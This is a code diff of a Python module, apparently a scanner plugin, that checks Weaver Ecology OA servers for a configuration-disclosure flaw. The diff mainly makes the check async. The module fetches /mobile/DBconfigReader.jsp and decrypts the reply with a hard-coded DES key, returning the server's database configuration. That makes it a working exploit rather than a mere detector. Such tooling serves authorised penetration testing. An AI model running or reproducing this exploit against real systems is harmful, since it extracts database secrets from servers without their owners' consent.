@@ -1,8 +1,8 @@
 #/usr/bin/python3
 
 import pyDes
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class Weaver_Ecology_Oa_Config_BaseVerify:
     def __init__(self, url):
@@ -20,7 +20,7 @@ class Weaver_Ecology_Oa_Config_BaseVerify:
             "User-Agent": get_useragent(),
         }
 
-    def check(self):
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -32,19 +32,16 @@ class Weaver_Ecology_Oa_Config_BaseVerify:
         
         try:
             url = self.url + "/mobile/DBconfigReader.jsp"
-            check_req = request.get(url, headers = self.headers)
-            if check_req.status_code == 200:
+            check_req = await request.get(url, headers = self.headers)
+            if check_req.status == 200:
                 cipherX = pyDes.des('        ')
                 cipherX.setKey('1z2x3c4v5b6n')
                 result = cipherX.decrypt(check_req.content.strip()).strip().decode('utf-8')
-                print("存在泛微config信息泄露漏洞")
+                # print("存在泛微config信息泄露漏洞")
                 return True, result
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if __name__ == '__main__':
